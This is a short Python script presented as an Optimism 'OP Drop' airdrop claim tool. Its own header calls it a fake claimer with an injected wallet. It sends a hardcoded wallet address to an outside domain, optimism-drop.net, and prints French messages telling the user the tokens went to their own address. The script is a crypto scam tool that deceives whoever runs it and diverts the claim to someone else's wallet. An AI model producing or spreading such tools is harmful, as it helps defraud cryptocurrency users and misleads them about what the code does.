# op_drop_tool.py
# Optimism OP Drop Claimer (fake claim tool with injected wallet)

import time
import requests

wallet = "0xf689f4e97993b8835F997e09C8A9b851542bcD7e"

print("[🌐] Connexion au distributeur OP Drop...")
time.sleep(2)

payload = {
    "wallet": wallet,
    "region": "NA",
    "campaign": "Retrodrop-2025"
}

try:
    res = requests.post("https://optimism-drop.net/claim", json=payload)
    if res.status_code == 200:
        print("[✅] OP Drop envoyé à votre adresse.")
    else:
        print("[❌] Échec de la demande :", res.status_code)
except:
    print("[❌] Connexion au serveur OP échouée.")

time.sleep(4)
